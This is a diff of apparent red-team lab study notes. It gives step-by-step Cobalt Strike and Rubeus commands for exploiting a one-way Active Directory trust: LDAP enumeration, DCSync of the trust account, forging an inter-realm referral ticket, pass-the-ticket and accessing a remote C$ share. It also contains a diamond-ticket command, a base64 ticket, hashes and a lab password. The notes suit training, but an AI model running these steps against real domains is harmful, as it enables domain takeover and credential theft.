@@ -87,6 +87,42 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg
 - execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /user:Adinistrator /ticket:doIGQDCCBjygAwIBBaEDAgEWooIFLjCCBSphggUmMIIFIqADAgEFoRQbEkRVQkxJTi5DT05UT1NPLkNPTaInMCWgAwIBAqEeMBwbBmtyYnRndBsSRFVCTElOLkNPTlRPU08uQ09No4IE2jCCBNagAwIBEqEDAgEDooIEyASCBMTJMm3mNohrk1iY+fR6NbTXhim6uZdKQKYwqXdyg/7mSCi5bM+HM1+TW8C7498m1Xyh5JnAPIOR/mr5EJAO+KprXdwN/Pc4QcZaEzZUU6rz/LHtb1LaQbtqJw/JbVV81IIhAeLq+QZZZ9jnGB0J/jxuUsAfPfoC7HbEcDCgr6MhIMNGFO+w62anV8sleGIdTt4+gVE7rxN8htG37U5K2t9O/7NL9joNOV9vIjx0QtI/tyBPWYwbrQsoK3xBc1Wg2N7owQY75InS3drJ2XshiKYT+0euw6ABhmg8JE60Ehnl1M2HgyKrHD82d/7lP3T5Q6tcChlihAAtfdIofTn2+aAVdPmxhnDtjKCNB85N2p2N5iHRu2ilpMAvX4MYlhudwegpk/Hc5OnV0T/FCz/uC/kJHV4uHq3kV1/PtebUtYtnvaRtSp5cfAJohQgSVj0LEeA5AI4XaaiUK2yxWzPZ3lDk+jBghg8dWNUaJAzUxRfOnWpRQPpre/Y4UHqPflMEPEdMMUriknupRa2SvGGPMyeq0HmgCUxo2LyK/ShkyoIs9QDcoLczEYbqMTVYZwInsZGu9Jp1lHW4IqhM0kDC72jXZ2zT5VuKExehCL+V6F1wbq8m10PjW2lTGGhTyw3NpEdxJUeBQr9c51NGjhXuEwHzTdFx788b+6EAHXTNmtvXRos1kbtfK0iVO85niX44pLqp3QCoLgb1EyQdlnhOgXCHExQybZ+DWiDYnmXYlfX3pGlhNkmyg7Yim2rfTAyRGBXDO/ZePvpyverjg8bzsOtKaF1rGoW1YjZ5B4SosYZ5IMjW+KFO5KOYKCUImCblpo8SHB5lApJ4lFve7rHpInQO7PWWFMW2j81Z9N5ssau6MtvaWl5Z5iRhr0C386YNfb0dLOI2pb0786GicjFrknnGiAqeoICqATgM0yPE5Km6LnjwVYLAoSAgqVJU4AQnvVEaD61eGajIc2scfj3AeJdQIO2NEIs8exLEylXiKJpTs8AW8XZiBTAVZl8v1lAOpa6Mo8Iu3d8OpWJvLdMPJmSVHiOdEYdGa3sPQDQL1AF6WKXb336qDOAVDWmneb1GdWi/YmFa7udb9phUJ0YI11gCOWg1zKuzcamyVcdjvXxmRD7ZLbmiRbxDdzdbmCRTfLfOjdl0FaBnvk6NBo7BFjFntwhkJk8LnyWaDDVi5NWo6JEnHC8c0M9qQCthBntZXZXDxdL9p8BasJH3g55sX8bT+Te3w9YRgPQxhvZiRpXdF4dldSx82JN+bDvcuizvT5sXyofm0Y8XTvsYmeCQSB+WpXcs2YVuFTQuYobY23EGGEG4KQjnPLJZ7ch0bIuJ9g+bSYdQrWW6VxGshiw1t3GNJaC1mhcmqN+dj1UK2LJA7+jGahmlLW6WpfR/hQE/eISLJqGzUEMSD4WGld5bThCTv/KlQaZGBge4FE1VZNqFoU1GzHc7z3UNxa9YEV1jGDE5ZgtPQSVWxzrmdKRClTx1N2L1XkugZff0rtQkY+05fCtIbDUi4/RtGtwYHe6o3j0GIuO+cvX3DkMu4DTM4FXvpUFsnx87Oosc0K5OJ7xfBWrJ0+fTgts94j1DQpRPLnTmR+Xu0IHH77voJeSnJ2qnvobMC6OB/TCB+qADAgEAooHyBIHvfYHsMIHpoIHmMIHjMIHgoCswKaADAgESoSIEIGOBPUiovaH1QM7VAUFsia0mEtv3IVYAvMtxyR2Zfl4UoRQbEkRVQkxJTi5DT05UT1NPLkNPTaIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyNTA5MDUxNDA5NTJaphEYDzIwMjUwOTA2MDAwODMyWqcRGA8yMDI1MDkxMjE0MDgzMlqoFBsSRFVCTElOLkNPTlRPU08uQ09NqScwJaADAgECoR4wHBsGa3JidGd0GxJEVUJMSU4uQ09OVE9TTy5DT00=
  /service:CIFS/lon-dc-1
+--------------------------------------------------
+
+One Way Inbound Trusts (inbound trust)
+
+1 - Who are you and your domain: getuid
+2 - beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname <-- Look at trust direction line
+3 - beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com <-- Check foreignSecurityPrincipal, principals form a external domain that are trusted and and allowed to be come a group in the trusted domain.. 
+-- We are in contoso and have 1 trust direction to partner.com so we check the foreignSecurityPrincipal on partner.
+-- we are not interested in the default values S-1-5-4, S-1-5-11, S-1-5-17, S-1-5-9
+4 - beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) <-- Replace with the SID weare interested in that exists in the trusted domain 
+5 - beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com <-- replace with the correct DC and hostname
+-- could use bofhound to feed data to bloodhound.
+
+Forging Referal Tickets
+6 - beacon> dcsync contoso.com CONTOSO\PARTNER$ <-- replace domain\Principal with data you need, need to be DA run make_token contoso\dyork Passw0rd!
+-- get RC4 hash, rev2self
+7- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
+-- /user:pchilds <-- from getuid
+-- /domain:Contoso.com <-- from getuid
+-- /sid: <-- from step 3 above, SID of trusted domain
+-- /id: <--RID of impersonated user
+-- /groups are the RIDs of the impersonated user's domain groups.  Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102. <--Replace the 6102 with the actual
+-- /service is the krbtgt service of trusting domain
+-- /rc4 is inter realm key from step 6 above
+** if forging off line imperative to get group membership correct can also use the /ldap flag in rubeus to do it online.
+Above forged a inter-realm TGT that we can use to request service ticket from the trusting domain via rubeus asktgs command
+
+8- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET FROM STEP 7] /nowrap
+-- /service is the target service in the trusting domain.
+-- /dc is a domain controller in the trusting domain.
+-- /ticket is the inter-realm TGT.
+9 - execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET] <-- inject ticket
+
+10 - Run Klist to check
+11 - ls \\par-jmp-1.partner.com\c$ <-- connect for the flag
+------------------------------------------------------------------
 
 
 
